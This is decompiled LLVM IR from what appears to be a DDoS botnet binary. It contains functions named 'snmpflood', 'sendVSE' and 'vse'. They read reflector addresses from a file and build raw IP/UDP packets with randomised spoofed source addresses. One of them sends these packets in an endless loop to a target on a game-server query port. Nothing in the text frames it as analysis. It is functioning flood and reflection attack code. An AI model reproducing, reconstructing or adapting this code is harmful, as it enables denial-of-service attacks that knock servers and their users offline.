  %v2_100039f8 = load i32, i32* %v1_100039f8, align 4
  store i32 268450308, i32* @lr, align 4
  %v1_10003a00 = call i32 @atol(i32 %v2_100039f8)
  store i32 0, i32* @global_var_10045194.121, align 4
  store i32 0, i32* @global_var_100451ac.120, align 4
  store i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32), i32* %r9.global-to-local, align 4
  store i32 268450368, i32* @lr, align 4
  %v3_10003a3c = call i32 @__GI_fopen(i32 ptrtoint ([9 x i8]* @global_var_1002a880.127 to i32), i32 ptrtoint ([2 x i8]* @global_var_1002a6f0.111 to i32))
  %v2_10003a60 = add i32 %v0_100039c8, -1
  br label %dec_label_pc_10003bd8.outer

dec_label_pc_10003a4c:                            ; preds = %dec_label_pc_10003bd8
  store i32 %v0_100039c8, i32* @r3, align 4
  %v0_10003a50 = call i32 @__GI_strlen()
  %v1_10003a64 = add i32 %v0_10003a50, %v2_10003a60
  store i32 %v1_10003a64, i32* %r9.global-to-local, align 4
  %v1_10003a68 = inttoptr i32 %v1_10003a64 to i8*
  %v2_10003a68 = load i8, i8* %v1_10003a68, align 1
  %v3_10003a70 = icmp eq i8 %v2_10003a68, 10
  br i1 %v3_10003a70, label %dec_label_pc_10003aa4, label %dec_label_pc_10003a78

dec_label_pc_10003a78:                            ; preds = %dec_label_pc_10003a4c
  store i32 %v0_100039c8, i32* @r3, align 4
  %v0_10003a7c = call i32 @__GI_strlen()
  %v1_10003a90 = add i32 %v0_10003a7c, %v2_10003a60
  store i32 %v1_10003a90, i32* %r9.global-to-local, align 4
  %v1_10003a94 = inttoptr i32 %v1_10003a90 to i8*
  %v2_10003a94 = load i8, i8* %v1_10003a94, align 1
  %v3_10003a9c = icmp eq i8 %v2_10003a94, 13
  br i1 %v3_10003a9c, label %dec_label_pc_10003aa4, label %dec_label_pc_10003bd8

dec_label_pc_10003aa4:                            ; preds = %dec_label_pc_10003a78, %dec_label_pc_10003a4c
  store i32 %v0_100039c8, i32* @r3, align 4
  %v0_10003aa8 = call i32 @__GI_strlen()
  %v1_10003abc = add i32 %v0_10003aa8, %v2_10003a60
  %v3_10003ac4 = inttoptr i32 %v1_10003abc to i8*
  store i8 0, i8* %v3_10003ac4, align 1
  store i32 268697600, i32* %r9.global-to-local, align 4
  %v3_10003acc = load i32, i32* @global_var_100451b4.106, align 4
  %v3_10003ad0 = icmp eq i32 %v3_10003acc, 0
  store i32 540, i32* @r3, align 4
  br i1 %v3_10003ad0, label %dec_label_pc_10003ad8, label %dec_label_pc_10003b5c

dec_label_pc_10003ad8:                            ; preds = %dec_label_pc_10003aa4
  store i32 268450528, i32* @lr, align 4
  %v0_10003adc = call i32 @malloc()
  store i32 %v0_10003adc, i32* @global_var_100451b4.106, align 4
  store i32 %v0_10003adc, i32* %r9.global-to-local, align 4
  %v2_10003afc = inttoptr i32 %v0_10003adc to i32*
  store i32 0, i32* %v2_10003afc, align 4
  %v1_10003b04 = load i32, i32* %r9.global-to-local, align 4
  %v2_10003b04 = add i32 %v1_10003b04, 4
  %v3_10003b04 = inttoptr i32 %v2_10003b04 to i32*
  store i32 0, i32* %v3_10003b04, align 4
  %v1_10003b0c = load i32, i32* %r9.global-to-local, align 4
  %v2_10003b0c = add i32 %v1_10003b0c, 8
  %v3_10003b0c = inttoptr i32 %v2_10003b0c to i32*
  store i32 0, i32* %v3_10003b0c, align 4
  %v1_10003b14 = load i32, i32* %r9.global-to-local, align 4
  %v2_10003b14 = add i32 %v1_10003b14, 12
  %v3_10003b14 = inttoptr i32 %v2_10003b14 to i32*
  store i32 0, i32* %v3_10003b14, align 4
  store i32 268697600, i32* %r9.global-to-local, align 4
  %v3_10003b1c = load i32, i32* @global_var_100451b4.106, align 4
  store i32 268450600, i32* @lr, align 4
  %v1_10003b24 = call i32 @inet_addr(i32 %v0_100039c8)
  %v2_10003b2c = add i32 %v3_10003b1c, 4
  %v3_10003b2c = inttoptr i32 %v2_10003b2c to i32*
  store i32 %v1_10003b24, i32* %v3_10003b2c, align 4
  %v3_10003b34 = load i32, i32* @global_var_100451b4.106, align 4
  %v2_10003b40 = add i32 %v3_10003b34, 532
  %v3_10003b40 = inttoptr i32 %v2_10003b40 to i32*
  store i32 %v3_10003b34, i32* %v3_10003b40, align 4
  %v3_10003b48 = load i32, i32* @global_var_100451b4.106, align 4
  store i32 %v3_10003b48, i32* %r11.global-to-local, align 4
  store i32 268697600, i32* %r9.global-to-local, align 4
  %v2_10003b54 = add i32 %v3_10003b48, 536
  %v3_10003b54 = inttoptr i32 %v2_10003b54 to i32*
  store i32 %v3_10003b48, i32* %v3_10003b54, align 4
  br label %dec_label_pc_10003bcc

dec_label_pc_10003b5c:                            ; preds = %dec_label_pc_10003aa4
  store i32 268450660, i32* @lr, align 4
  %v0_10003b60 = call i32 @malloc()
  store i32 540, i32* %r9.global-to-local, align 4
  store i32 %v0_10003b60, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 540, i32* @r5, align 4
  store i32 268450692, i32* @lr, align 4
  %v0_10003b80 = call i32 @__GI_memset()
  store i32 268450700, i32* @lr, align 4
  %v1_10003b88 = call i32 @inet_addr(i32 %v0_100039c8)
  %v2_10003b94 = add i32 %v0_10003b60, 4
  %v3_10003b94 = inttoptr i32 %v2_10003b94 to i32*
  store i32 %v1_10003b88, i32* %v3_10003b94, align 4
  %v3_10003b9c = load i32, i32* @global_var_100451b4.106, align 4
  %v2_10003ba4 = add i32 %v0_10003b60, 536
  %v3_10003ba4 = inttoptr i32 %v2_10003ba4 to i32*
  store i32 %v3_10003b9c, i32* %v3_10003ba4, align 4
  %v3_10003bac = load i32, i32* @global_var_100451b4.106, align 4
  store i32 %v3_10003bac, i32* %r9.global-to-local, align 4
  %v1_10003bb0 = add i32 %v3_10003bac, 532
  %v2_10003bb0 = inttoptr i32 %v1_10003bb0 to i32*
  %v3_10003bb0 = load i32, i32* %v2_10003bb0, align 4
  %v2_10003bb8 = add i32 %v0_10003b60, 532
  %v3_10003bb8 = inttoptr i32 %v2_10003bb8 to i32*
  store i32 %v3_10003bb0, i32* %v3_10003bb8, align 4
  %v3_10003bc0 = load i32, i32* @global_var_100451b4.106, align 4
  store i32 %v3_10003bc0, i32* %r9.global-to-local, align 4
  %v2_10003bc8 = add i32 %v3_10003bc0, 532
  %v3_10003bc8 = inttoptr i32 %v2_10003bc8 to i32*
  store i32 %v0_10003b60, i32* %v3_10003bc8, align 4
  br label %dec_label_pc_10003bcc

dec_label_pc_10003bcc:                            ; preds = %dec_label_pc_10003ad8, %dec_label_pc_10003b5c
  store i32 %stack_var_-1096.0.ph, i32* %r9.global-to-local, align 4
  %v1_10003bd0 = add i32 %stack_var_-1096.0.ph, 1
  br label %dec_label_pc_10003bd8.outer

dec_label_pc_10003bd8.outer:                      ; preds = %dec_label_pc_10003bcc, %dec_label_pc_100038f8
  %stack_var_-1096.0.ph = phi i32 [ %v1_10003bd0, %dec_label_pc_10003bcc ], [ 0, %dec_label_pc_100038f8 ]
  br label %dec_label_pc_10003bd8

dec_label_pc_10003bd8:                            ; preds = %dec_label_pc_10003bd8.outer, %dec_label_pc_10003a78
  store i32 268450792, i32* @lr, align 4
  %v3_10003be4 = call i32 @fgets(i32 %v0_100039c8, i32 128, i32 %v3_10003a3c)
  %v3_10003bec = icmp eq i32 %v3_10003be4, 0
  br i1 %v3_10003bec, label %dec_label_pc_10003bf4, label %dec_label_pc_10003a4c

dec_label_pc_10003bf4:                            ; preds = %dec_label_pc_10003bd8
  %v3_10003bf8 = load i32, i32* @global_var_100451b4.106, align 4
  store i32 %v3_10003bf8, i32* %r9.global-to-local, align 4
  %v1_10003bfc = add i32 %v3_10003bf8, 532
  %v2_10003bfc = inttoptr i32 %v1_10003bfc to i32*
  %v3_10003bfc = load i32, i32* %v2_10003bfc, align 4
  %v1_10003c10 = add i32 %arg4, 4
  store i32 %v1_10003c10, i32* %r9.global-to-local, align 4
  %v1_10003c14 = inttoptr i32 %v1_10003c10 to i32*
  %v2_10003c14 = load i32, i32* %v1_10003c14, align 4
  store i32 268450848, i32* @lr, align 4
  %v1_10003c1c = call i32 @inet_addr(i32 %v2_10003c14)
  %v1_10003c2c = mul i32 %v1_100039e4, 28
  %v1_10003c34 = add i32 %v1_10003c2c, 30
  %v1_10003c38 = and i32 %v1_10003c34, -16
  %v2_10003c40 = load i32, i32* %stack_var_-1136, align 4
  %v1_10003c48 = load i32, i32* @r1, align 4
  %v3_10003c48 = sub i32 %v1_10003c48, %v1_10003c38
  %v4_10003c48 = inttoptr i32 %v3_10003c48 to i32*
  store i32 %v2_10003c40, i32* %v4_10003c48, align 4
  %v1_10003c58 = add i32 %v3_10003c48, 23
  %v1_10003c5c = and i32 %v1_10003c58, -16
  store i32 %v1_100039e4, i32* %r9.global-to-local, align 4
  %v2_10003d0c4 = icmp sgt i32 %v1_100039e4, 0
  br i1 %v2_10003d0c4, label %dec_label_pc_10003c7c, label %dec_label_pc_10003d14

dec_label_pc_10003c7c:                            ; preds = %dec_label_pc_10003bf4, %dec_label_pc_10003c7c
  %storemerge27 = phi i32 [ %v1_10003cfc, %dec_label_pc_10003c7c ], [ 0, %dec_label_pc_10003bf4 ]
  %v1_10003c84 = mul i32 %storemerge27, 28
  %v2_10003c88 = add i32 %v1_10003c84, %v1_10003c5c
  %v2_10003c90 = inttoptr i32 %v2_10003c88 to i32*
  store i32 %storemerge27, i32* %v2_10003c90, align 4
  store i32 %v2_10003c88, i32* %r9.global-to-local, align 4
  store i32 %v1_10003c1c, i32* %r11.global-to-local, align 4
  %v2_10003cb4 = add i32 %v2_10003c88, 8
  %v3_10003cb4 = inttoptr i32 %v2_10003cb4 to i32*
  store i32 2, i32* %v3_10003cb4, align 4
  %v0_10003cb8 = load i32, i32* %r11.global-to-local, align 4
  %v1_10003cb8 = load i32, i32* %r9.global-to-local, align 4
  %v2_10003cb8 = add i32 %v1_10003cb8, 12
  %v3_10003cb8 = inttoptr i32 %v2_10003cb8 to i32*
  store i32 %v0_10003cb8, i32* %v3_10003cb8, align 4
  %v0_10003cbc = load i32, i32* %r10.global-to-local, align 4
  %v1_10003cbc = load i32, i32* %r9.global-to-local, align 4
  %v2_10003cbc = add i32 %v1_10003cbc, 16
  %v3_10003cbc = inttoptr i32 %v2_10003cbc to i32*
  store i32 %v0_10003cbc, i32* %v3_10003cbc, align 4
  %v1_10003cc0 = load i32, i32* %r9.global-to-local, align 4
  %v2_10003cc0 = add i32 %v1_10003cc0, 20
  %v3_10003cc0 = inttoptr i32 %v2_10003cc0 to i32*
  store i32 %tmp, i32* %v3_10003cc0, align 4
  %v1_10003cd4 = add i32 %v2_10003c88, 4
  %v2_10003cdc = inttoptr i32 %v1_10003cd4 to i32*
  store i32 %v3_10003bfc, i32* %v2_10003cdc, align 4
  store i32 %v1_10003c5c, i32* %r9.global-to-local, align 4
  %v3_10003cf4 = call i32 @snmpflood(i32 %v2_10003c88, i32 %tmp, i32 %v1_10003c5c)
  %v1_10003cfc = add nuw nsw i32 %storemerge27, 1
  store i32 %v1_100039e4, i32* %r9.global-to-local, align 4
  %v2_10003d0c = icmp slt i32 %v1_10003cfc, %v1_100039e4
  br i1 %v2_10003d0c, label %dec_label_pc_10003c7c, label %dec_label_pc_10003d14

dec_label_pc_10003d14:                            ; preds = %dec_label_pc_10003c7c, %dec_label_pc_10003bf4
  store i32 %v1_10003c10, i32* %r9.global-to-local, align 4
  %v2_10003d1c = load i32, i32* %v1_10003c14, align 4
  %v1_10003d24 = add i32 %arg4, 8
  store i32 %v1_10003d24, i32* %r9.global-to-local, align 4
  %v1_10003d28 = inttoptr i32 %v1_10003d24 to i32*
  %v2_10003d28 = load i32, i32* %v1_10003d28, align 4
  store i32 %v2_10003d28, i32* %r11.global-to-local, align 4
  store i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32), i32* %r9.global-to-local, align 4
  %v7_10003d48 = call i32 @Send(i32 %arg1, i32 ptrtoint ([37 x i8]* @global_var_1002a88c.128 to i32), i32 %arg2, i32 %v2_10003d1c)
  %v1_10003e30 = add i32 %arg4, 24
  %v1_10003e34 = inttoptr i32 %v1_10003e30 to i32*
  br label %dec_label_pc_10003e2c

dec_label_pc_10003d58:                            ; preds = %dec_label_pc_10003e2c
  store i32 1000, i32* %r9.global-to-local, align 4
  store i32 268451184, i32* @lr, align 4
  %v1_10003d6c = call i32 @usleep(i32 50000)
  %v3_10003d74 = load i32, i32* @global_var_100451ac.120, align 4
  %v2_10003d7c = mul i32 %v3_10003d74, 20
  %v3_10003d84 = icmp ugt i32 %v2_10003d7c, %v1_10003a00
  store i32 268697600, i32* %r9.global-to-local, align 4
  %v3_10003d90 = load i32, i32* @global_var_10045194.121, align 4
  br i1 %v3_10003d84, label %dec_label_pc_10003d8c, label %dec_label_pc_10003dcc

dec_label_pc_10003d8c:                            ; preds = %dec_label_pc_10003d58
  %v2_10003d94 = icmp sgt i32 %v3_10003d90, 0
  store i32 268697600, i32* %r9.global-to-local, align 4
  br i1 %v2_10003d94, label %dec_label_pc_10003db4, label %dec_label_pc_10003d9c

dec_label_pc_10003d9c:                            ; preds = %dec_label_pc_10003d8c
  %v3_10003da0 = load i32, i32* @global_var_100450d4.122, align 4
  %v1_10003da4 = add i32 %v3_10003da0, 100
  store i32 268697600, i32* %r9.global-to-local, align 4
  store i32 %v1_10003da4, i32* @global_var_100450d4.122, align 4
  br label %dec_label_pc_10003e14

dec_label_pc_10003db4:                            ; preds = %dec_label_pc_10003d8c
  %v1_10003dbc = add i32 %v3_10003d90, -1
  store i32 268697600, i32* %r9.global-to-local, align 4
  store i32 %v1_10003dbc, i32* @global_var_10045194.121, align 4
  br label %dec_label_pc_10003e14

dec_label_pc_10003dcc:                            ; preds = %dec_label_pc_10003d58
  %v1_10003dd4 = add i32 %v3_10003d90, 1
  store i32 %v1_10003dd4, i32* @global_var_10045194.121, align 4
  %v3_10003de4 = load i32, i32* @global_var_100450d4.122, align 4
  %tmp38 = icmp ult i32 %v3_10003de4, 26
  store i32 268697600, i32* %r9.global-to-local, align 4
  br i1 %tmp38, label %dec_label_pc_10003e08, label %dec_label_pc_10003df0

dec_label_pc_10003df0:                            ; preds = %dec_label_pc_10003dcc
  %v1_10003df8 = add i32 %v3_10003de4, -25
  store i32 268697600, i32* %r9.global-to-local, align 4
  store i32 %v1_10003df8, i32* @global_var_100450d4.122, align 4
  br label %dec_label_pc_10003e14

dec_label_pc_10003e08:                            ; preds = %dec_label_pc_10003dcc
  store i32 0, i32* @global_var_100450d4.122, align 4
  br label %dec_label_pc_10003e14

dec_label_pc_10003e14:                            ; preds = %dec_label_pc_10003df0, %dec_label_pc_10003db4, %dec_label_pc_10003d9c, %dec_label_pc_10003e08
  store i32 0, i32* @global_var_100451ac.120, align 4
  store i32 %storemerge3, i32* %r9.global-to-local, align 4
  %v1_10003e24 = add i32 %storemerge3, 1
  br label %dec_label_pc_10003e2c

dec_label_pc_10003e2c:                            ; preds = %dec_label_pc_10003d14, %dec_label_pc_10003e14
  %storemerge3 = phi i32 [ 0, %dec_label_pc_10003d14 ], [ %v1_10003e24, %dec_label_pc_10003e14 ]
  store i32 %v1_10003e30, i32* %r9.global-to-local, align 4
  %v2_10003e34 = load i32, i32* %v1_10003e34, align 4
  store i32 268451392, i32* @lr, align 4
  %v1_10003e3c = call i32 @atol(i32 %v2_10003e34)
  %v2_10003e48 = mul i32 %v1_10003e3c, 20
  store i32 %v2_10003e48, i32* %r9.global-to-local, align 4
  %v3_10003e50 = icmp sgt i32 %v2_10003e48, %storemerge3
  br i1 %v3_10003e50, label %dec_label_pc_10003d58, label %dec_label_pc_10003e58

dec_label_pc_10003e58:                            ; preds = %dec_label_pc_10003e2c, %entry, %dec_label_pc_100038c8
  %v0_10003e84 = phi i32 [ %v1_10003860, %entry ], [ %v0_100038d8, %dec_label_pc_100038c8 ], [ %v1_10003e3c, %dec_label_pc_10003e2c ]
  %v2_10003e58 = load i32, i32* %stack_var_-1136, align 4
  store i32 %v5_10003828, i32* %r9.global-to-local, align 4
  store i32 %v2_10003e58, i32* %r11.global-to-local, align 4
  ret i32 %v0_10003e84

; uselistorder directives
  uselistorder i32 %storemerge3, { 2, 0, 1 }
  uselistorder i32 %v3_10003d90, { 1, 0, 2 }
  uselistorder i32 %v1_10003e30, { 1, 0 }
  uselistorder i32 %v1_10003cfc, { 1, 0 }
  uselistorder i32 %v2_10003c88, { 0, 1, 3, 2, 4 }
  uselistorder i32 %storemerge27, { 2, 1, 0 }
  uselistorder i32 %v1_10003c5c, { 2, 1, 0 }
  uselistorder i32 %stack_var_-1096.0.ph, { 1, 0 }
  uselistorder i32 %v3_10003b48, { 1, 0, 2 }
  uselistorder i32 %v3_10003b34, { 1, 0 }
  uselistorder i32 %v1_100039e4, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v0_100039c8, { 6, 1, 2, 3, 0, 5, 4 }
  uselistorder i32 %v2_10003938, { 1, 0, 2 }
  uselistorder i32 %v2_10003928, { 1, 0 }
  uselistorder i32 %v1_100038e4, { 2, 1, 0, 3, 4 }
  uselistorder i32* %v1_100038d0, { 0, 2, 1, 4, 3, 5 }
  uselistorder i32 %v1_100038cc, { 0, 2, 1, 4, 3, 5, 6 }
  uselistorder i32* %stack_var_-1136, { 0, 1, 3, 2 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 1, 9, 11, 2, 4, 3, 5, 6, 7, 8, 10, 12, 13, 14, 20, 15, 16, 17, 18, 19, 0, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10003e58, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10003e2c, { 1, 0 }
  uselistorder label %dec_label_pc_10003e14, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10003c7c, { 1, 0 }
  uselistorder label %dec_label_pc_10003bcc, { 1, 0 }
  uselistorder label %dec_label_pc_100038c8, { 1, 0 }
  uselistorder label %dec_label_pc_1000389c, { 1, 0 }
}

define i32 @sendVSE(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-4148 = alloca i32, align 4
  %v2_10003eac = ptrtoint i32* %stack_var_-4148 to i32
  %v1_10003eb8 = add i32 %v2_10003eac, 20
  store i32 2, i32* %stack_var_-52, align 4
  store i32 17015, i32* @r3, align 4
  %v1_10003ecc = call i32 @htons(i32 17015)
  store i32 268451552, i32* @lr, align 4
  %v1_10003edc = call i32 @inet_addr(i32 %arg1)
  store i32 268451576, i32* @lr, align 4
  %v3_10003ef4 = call i32 @socket(i32 2, i32 3, i32 17)
  %tmp19 = icmp sgt i32 %v3_10003ef4, -1
  br i1 %tmp19, label %dec_label_pc_10003f14, label %dec_label_pc_10003f0c

dec_label_pc_10003f0c:                            ; preds = %entry
  %v0_10003f10 = call i32 @__GI_exit()
  br label %dec_label_pc_10003f14

dec_label_pc_10003f14:                            ; preds = %entry, %dec_label_pc_10003f0c
  store i32 %v2_10003eac, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 4096, i32* @r5, align 4
  store i32 268451628, i32* @lr, align 4
  %v0_10003f28 = call i32 @__GI_memset()
  store i32 268451636, i32* @lr, align 4
  %v2_10003f30 = call i32 @setup_ip_header(i32* nonnull %stack_var_-4148)
  %v1_10003f38 = call i32 @setup_udp_header(i32 %v1_10003eb8)
  %v2_10003f44 = add i32 %v2_10003eac, 16
  %v3_10003f44 = inttoptr i32 %v2_10003f44 to i32*
  store i32 %v1_10003edc, i32* %v3_10003f44, align 4
  %v1_10003f50 = or i32 %v2_10003eac, 2
  %v2_10003f50 = inttoptr i32 %v1_10003f50 to i16*
  %v3_10003f50 = load i16, i16* %v2_10003f50, align 2
  %v4_10003f50 = zext i16 %v3_10003f50 to i32
  %v2_10003f60 = bitcast i32* %stack_var_-4148 to i16*
  %v3_10003f60 = call i32 @csum(i16* %v2_10003f60, i32 %v4_10003f50)
  %v1_10003f6c = trunc i32 %v3_10003f60 to i16
  %v3_10003f6c = add i32 %v2_10003eac, 10
  %v4_10003f6c = inttoptr i32 %v3_10003f6c to i16*
  store i16 %v1_10003f6c, i16* %v4_10003f6c, align 2
  store i32 1, i32* %stack_var_-36, align 4
  %v2_10003f78 = ptrtoint i32* %stack_var_-36 to i32
  store i32 268451736, i32* @lr, align 4
  %v5_10003f94 = call i32 @__GI_setsockopt(i32 %v3_10003ef4, i32 0, i32 3, i32 %v2_10003f78, i32 4)
  %tmp20 = icmp sgt i32 %v5_10003f94, -1
  br i1 %tmp20, label %dec_label_pc_10003fac, label %dec_label_pc_10003fa4

dec_label_pc_10003fa4:                            ; preds = %dec_label_pc_10003f14
  %v0_10003fa8 = call i32 @__GI_exit()
  br label %dec_label_pc_10003fac

dec_label_pc_10003fac:                            ; preds = %dec_label_pc_10003f14, %dec_label_pc_10003fa4
  store i32 268451764, i32* @lr, align 4
  %v1_10003fb0 = call i32 @__GI_time(i32 0)
  %v1_10003fbc = call i32 @init_rand(i32 %v1_10003fb0)
  %v2_10003fd0 = ptrtoint i32* %stack_var_-52 to i32
  %v2_1000404c = add i32 %v2_10003eac, 12
  %v3_1000404c = inttoptr i32 %v2_1000404c to i32*
  %v3_1000406c = add i32 %v2_10003eac, 4
  %v4_1000406c = inttoptr i32 %v3_1000406c to i16*
  br label %dec_label_pc_10003fc0

dec_label_pc_10003fc0:                            ; preds = %dec_label_pc_10003fc0, %dec_label_pc_10003fac
  %v3_10003fc4 = load i16, i16* %v2_10003f50, align 2
  %v4_10003fc4 = zext i16 %v3_10003fc4 to i32
  store i32 268451828, i32* @lr, align 4
  %v6_10003ff0 = call i32 @sendto(i32 %v3_10003ef4, i32 %v2_10003eac, i32 %v4_10003fc4, i32 0, i32 %v2_10003fd0, i32 16)
  %v0_10003ff4 = call i32 @rand_cmwc()
  %v1_10003ffc = urem i32 %v0_10003ff4, 16777216
  %v1_10004004 = sub i32 %v0_10003ff4, %v1_10003ffc
  %v0_10004008 = call i32 @rand_cmwc()
  %v1_10004014 = and i32 %v0_10004008, 16711680
  %v2_1000401c = or i32 %v1_10004004, %v1_10004014
  %v0_10004020 = call i32 @rand_cmwc()
  %v1_1000402c = and i32 %v0_10004020, 65280
  %v2_10004034 = or i32 %v2_1000401c, %v1_1000402c
  %v0_10004038 = call i32 @rand_cmwc()
  %v1_10004040 = urem i32 %v0_10004038, 256
  %v2_10004044 = or i32 %v2_10004034, %v1_10004040
  store i32 %v2_10004044, i32* %v3_1000404c, align 4
  %v0_10004050 = call i32 @rand_cmwc()
  store i32 %v0_10004050, i32* @r3, align 4
  %v1_1000405c = call i32 @htonl(i32 %v0_10004050)
  %v1_1000406c = trunc i32 %v1_1000405c to i16
  store i16 %v1_1000406c, i16* %v4_1000406c, align 4
  %v3_10004078 = load i16, i16* %v2_10003f50, align 2
  %v4_10004078 = zext i16 %v3_10004078 to i32
  %v3_10004088 = call i32 @csum(i16* %v2_10003f60, i32 %v4_10004078)
  %sext2 = mul i32 %v3_10004088, 65536
  %v1_1000408c = sdiv i32 %sext2, 65536
  %v1_10004094 = trunc i32 %v1_1000408c to i16
  store i16 %v1_10004094, i16* %v4_10003f6c, align 2
  br label %dec_label_pc_10003fc0

; uselistorder directives
  uselistorder i32 %v2_10003eac, { 5, 1, 2, 3, 0, 4, 6, 7 }
  uselistorder i32* %stack_var_-4148, { 1, 0, 2 }
  uselistorder i32* %stack_var_-36, { 1, 0 }
  uselistorder i32* %stack_var_-52, { 1, 0 }
  uselistorder label %dec_label_pc_10003fac, { 1, 0 }
  uselistorder label %dec_label_pc_10003f14, { 1, 0 }
}

define i32 @vse(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-2656 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_1000409c = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_1000409c, i32* %stack_var_-2656, align 4
  %v5_1000409c = ptrtoint i32* %stack_var_-2656 to i32
  %v1_100040cc = call i32 @mfork(i32 %arg2)
  %v3_100040d4 = icmp eq i32 %v1_100040cc, 0
  br i1 %v3_100040d4, label %dec_label_pc_100040dc, label %dec_label_pc_100044c0

dec_label_pc_100040dc:                            ; preds = %entry
  store i32 268452076, i32* @lr, align 4
  %v3_100040e8 = call i32 @socket(i32 2, i32 3, i32 255)
  %tmp36 = icmp sgt i32 %v3_100040e8, -1
  br i1 %tmp36, label %dec_label_pc_10004108, label %dec_label_pc_10004100

dec_label_pc_10004100:                            ; preds = %dec_label_pc_100040dc
  %v0_10004104 = call i32 @__GI_exit()
  br label %dec_label_pc_10004108

dec_label_pc_10004108:                            ; preds = %dec_label_pc_100040dc, %dec_label_pc_10004100
  %v2_1000410c = icmp sgt i32 %arg3, 3
  br i1 %v2_1000410c, label %dec_label_pc_10004134, label %dec_label_pc_10004114

dec_label_pc_10004114:                            ; preds = %dec_label_pc_10004108
  store i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32), i32* %r9.global-to-local, align 4
  %v6_10004128 = call i32 @Send(i32 %arg1, i32 ptrtoint ([89 x i8]* @global_var_1002a8b4.131 to i32), i32 %arg2, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  %v0_10004130 = call i32 @__GI_exit()
  br label %dec_label_pc_10004134

dec_label_pc_10004134:                            ; preds = %dec_label_pc_10004108, %dec_label_pc_10004114
  %v1_10004138 = add i32 %arg4, 12
  store i32 %v1_10004138, i32* %r9.global-to-local, align 4
  %v1_1000413c = inttoptr i32 %v1_10004138 to i32*
  %v2_1000413c = load i32, i32* %v1_1000413c, align 4
  store i32 %v2_1000413c, i32* @r3, align 4
  %v0_10004144 = call i32 @__GI_strlen()
  %v1_1000414c = mul i32 %v0_10004144, 5
  store i32 %v1_1000414c, i32* %r9.global-to-local, align 4
  %v1_10004150 = add i32 %v1_1000414c, 160
  %v2_1000415c = icmp sgt i32 %v1_10004150, 1023
  br i1 %v2_1000415c, label %dec_label_pc_100044c0, label %dec_label_pc_10004164

dec_label_pc_10004164:                            ; preds = %dec_label_pc_10004134
  store i32 268452204, i32* @lr, align 4
  %v1_10004168 = call i32 @__GI_time(i32 0)
  store i32 ptrtoint (i32* @global_var_10004178.133 to i32), i32* @lr, align 4
  %v1_10004174 = call i32 @srand(i32 %v1_10004168)
  store i32 268697600, i32* %r9.global-to-local, align 4
  store i32 0, i32* @global_var_100451b4.106, align 4
  store i32 128, i32* @r3, align 4
  store i32 268452256, i32* @lr, align 4
  %v0_1000419c = call i32 @malloc()
  store i32 128, i32* %r9.global-to-local, align 4
  store i32 %v0_1000419c, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 128, i32* @r5, align 4
  store i32 268452288, i32* @lr, align 4
  %v0_100041bc = call i32 @__GI_memset()
  %v1_100041cc = add i32 %arg4, 4
  store i32 %v1_100041cc, i32* %r9.global-to-local, align 4
  %v1_100041d0 = inttoptr i32 %v1_100041cc to i32*
  %v2_100041d0 = load i32, i32* %v1_100041d0, align 4
  store i32 268452320, i32* @lr, align 4
  %v3_100041dc = call i32 @host2ip(i32 %arg2, i32 %v2_100041d0, i32 %v1_100041cc)
  %v1_100041ec = add i32 %arg4, 8
  store i32 %v1_100041ec, i32* %r9.global-to-local, align 4
  %v1_100041f0 = inttoptr i32 %v1_100041ec to i32*
  %v2_100041f0 = load i32, i32* %v1_100041f0, align 4
  store i32 268452348, i32* @lr, align 4
  %v1_100041f8 = call i32 @atol(i32 %v2_100041f0)
  store i32 %v1_10004138, i32* %r9.global-to-local, align 4
  %v2_1000420c = load i32, i32* %v1_1000413c, align 4
  store i32 268452376, i32* @lr, align 4
  %v1_10004214 = call i32 @atol(i32 %v2_1000420c)
  %v1_10004224 = add i32 %arg4, 16
  store i32 %v1_10004224, i32* %r9.global-to-local, align 4
  %v1_10004228 = inttoptr i32 %v1_10004224 to i32*
  %v2_10004228 = load i32, i32* %v1_10004228, align 4
  store i32 268452404, i32* @lr, align 4
  %v1_10004230 = call i32 @atol(i32 %v2_10004228)
  %v1_10004240 = add i32 %arg4, 20
  store i32 %v1_10004240, i32* %r9.global-to-local, align 4
  %v1_10004244 = inttoptr i32 %v1_10004240 to i32*
  %v2_10004244 = load i32, i32* %v1_10004244, align 4
  store i32 268452432, i32* @lr, align 4
  %v1_1000424c = call i32 @atol(i32 %v2_10004244)
  store i32 0, i32* @global_var_10045194.121, align 4
  store i32 0, i32* @global_var_100451ac.120, align 4
  store i32 %v1_100041cc, i32* %r9.global-to-local, align 4
  %v2_10004290 = load i32, i32* %v1_100041d0, align 4
  store i32 268452508, i32* @lr, align 4
  %v1_10004298 = call i32 @inet_addr(i32 %v2_10004290)
  %v1_100042a8 = mul i32 %v1_10004214, 28
  %v1_100042b0 = add i32 %v1_100042a8, 30
  %v1_100042b4 = and i32 %v1_100042b0, -16
  %v2_100042bc = load i32, i32* %stack_var_-2656, align 4
  %v1_100042c4 = load i32, i32* @r1, align 4
  %v3_100042c4 = sub i32 %v1_100042c4, %v1_100042b4
  %v4_100042c4 = inttoptr i32 %v3_100042c4 to i32*
  store i32 %v2_100042bc, i32* %v4_100042c4, align 4
  %v1_100042d4 = add i32 %v3_100042c4, 23
